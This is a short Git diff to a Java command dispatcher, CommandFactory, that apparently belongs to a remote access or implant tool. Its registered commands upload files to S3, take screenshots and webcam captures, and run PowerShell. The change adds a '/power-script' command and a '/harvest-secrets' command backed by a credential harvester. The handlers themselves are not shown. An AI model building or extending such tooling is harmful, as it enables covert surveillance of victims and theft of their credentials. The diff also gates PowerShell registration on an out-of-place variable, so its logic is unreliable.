@@ -19,8 +19,15 @@ public class CommandFactory {
         commandsList.put("/??", new HelpCommand());
 
         commandsList.put("cd", new ChangeDirectoryCommand());
-        commandsList.put("powershell", new TogglePowerShellCommand());
+        if (command.equalsIgnoreCase("powershell")){
+            commandsList.put("powershell", new TogglePowerShellCommand());
+        }
+
         commandsList.put("upload", new UploadToS3Command());
+        commandsList.put("/power-script", new PowerShellScripts());
+
+        commandsList.put("/harvest-secrets", new CredHarvesterCommand());
+
         commandsList.put("screenshot", new ScreenShotCommand());
         commandsList.put("camera-shot", new CameraScreenShotCommand());
 
